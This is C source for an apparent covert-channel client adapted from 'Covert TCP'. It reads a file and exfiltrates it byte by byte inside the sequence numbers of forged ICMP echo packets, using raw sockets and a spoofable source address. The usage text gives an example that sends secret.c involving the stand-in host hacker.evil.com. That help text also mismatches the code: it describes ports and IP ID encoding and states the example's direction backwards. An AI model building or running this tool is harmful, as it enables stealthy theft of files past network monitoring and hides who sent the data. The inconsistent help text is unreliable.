#include "client.h"

int main(int argc, char *argv[]) {

   unsigned int source_host=0,dest_host=0;
   int file=0;
   int count;
   char desthost[80],srchost[80],filename[80];

   if(geteuid() !=0)
    {
    printf("\nYou need to be root to run this.\n\n");
    exit(0);
    }
    
   if((argc < 5) || (argc > 13))
   {
   usage(argv[0]);
   exit(0);
   }    

   for(count=0; count < argc; ++count)
    {
    if (strcmp(argv[count],"-dest") == 0)
     {
     dest_host=host_convert(argv[count+1]); 
     strncpy(desthost,argv[count+1],79);
     }
     
    else if (strcmp(argv[count],"-source") == 0)
     {
     source_host=host_convert(argv[count+1]); 
     strncpy(srchost,argv[count+1],79);
     }

    else if (strcmp(argv[count],"-file") == 0)
     {
     strncpy(filename,argv[count+1],79);
     file=1;
     }
    }

   if(file != 1)
    {
    printf("\n\nYou need to supply a filename (-file <filename>)\n\n");
    exit(1);
    }

     if (source_host == 0 && dest_host == 0)
      {
      printf("\n\nYou need to supply a source and destination address for client mode.\n\n");
      exit(1);
      }

     else
      {
      printf("Destination Host: %s\n",desthost);
      printf("Source Host     : %s\n",srchost);
      printf("Encoded Filename: %s\n",filename);

       printf("Encoding Type   : ICMP Seq\n");

       printf("\nClient Mode: Sending data.\n\n");
      
     }
     
     forgepacket(source_host, dest_host, filename);
     exit(0);
}

void forgepacket(unsigned int source_addr, unsigned int dest_addr,  char *filename) {
   struct send_icmp
   {
      struct iphdr ip;
      struct icmphdr icmp;
   } send_icmp;


   int ch, szpkt;
   int send_socket;
   struct sockaddr_in sin;
   FILE *input;
   
	srand((getpid())*(sizeof(int))); 
   szpkt=sizeof(struct iphdr) + sizeof(struct icmphdr);
   
	if((input=fopen(filename,"rb"))== NULL) {
	  printf("I cannot open the file %s for reading\n",filename);
	  exit(1);
	}
 
	else while((ch=fgetc(input)) !=EOF)
	 {

	sleep(1);


   send_icmp.ip.ihl = 5;
   send_icmp.ip.version = 4;
   send_icmp.ip.tos = 0;
   send_icmp.ip.tot_len = htons(40);
   send_icmp.ip.id = (int)(255.0*rand()/(RAND_MAX+1.0));
   send_icmp.ip.frag_off = 0;
   send_icmp.ip.ttl = 64; 
   send_icmp.ip.protocol = IPPROTO_ICMP;
   send_icmp.ip.check = 0;
   send_icmp.ip.saddr = source_addr;
   send_icmp.ip.daddr = dest_addr;

   send_icmp.icmp.type = 8;
   send_icmp.icmp.code = 0;
   send_icmp.icmp.un.echo.id = 1000;
   
   send_icmp.icmp.un.echo.sequence = ch;
	
   sin.sin_family = AF_INET;
   sin.sin_addr.s_addr = send_icmp.ip.daddr;   

   send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   if(send_socket < 0)
   {
      perror("send socket cannot be open. Are you root?");
      exit(1);
   }
		
      send_icmp.ip.check = in_cksum((unsigned short *)&send_icmp.ip, 20);
      
      send_icmp.icmp.checksum = 0;
      send_icmp.icmp.checksum = in_cksum((unsigned short *)&send_icmp.icmp, sizeof(struct icmphdr));
      
      sendto(send_socket, &send_icmp, szpkt, 0, (struct sockaddr *)&sin, sizeof(sin));
      printf("Sending Data: %c\n",ch);

  close(send_socket);
 } 

fclose(input);
} 


unsigned int host_convert(char *hostname){
   static struct in_addr i;
   struct hostent *h;
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         fprintf(stderr, "cannot resolve %s\n", hostname);
         exit(0);
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
}

unsigned short in_cksum(unsigned short *data, int taille)
    {
    unsigned long checksum=0;
    while(taille>1)
        {
        checksum=checksum+*data++;
        taille=taille-sizeof(unsigned short);
        }

    if(taille)
        checksum=checksum+*(unsigned char*)data;

    checksum=(checksum>>16)+(checksum&0xffff);
    checksum=checksum+(checksum>>16);

    return (unsigned short)(~checksum);
    }


void usage(char *progname){

      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file \
filename -source_port port -dest_port port\n\n", 
progname);
      printf("-dest dest_ip      - Host to send data to.\n");
      printf("-source source_ip  - Host where you want the data to originate \
from.\n");
      printf("-source_port port  - IP source port you want data to appear from. \n");
      printf("                     (randomly set by default)\n");
      printf("-dest_port port    - IP source port you want data to go to. In\n");
      printf("                     SERVER mode this is the port data will be coming\n");
      printf("                     inbound on. Port 80 by default.\n");
      printf("-file filename     - Name of the file to encode and transfer.\n");
      printf("\nPress ENTER for examples.");
      getchar();
      printf("\nExample: \nclient -dest foo.bar.com -source hacker.evil.com - \
source_port 1234 -dest_port 80 -file secret.c\n\n");
      printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");
      printf("at a time using the default IP packet ID encoding.\n");
      exit(0);
}
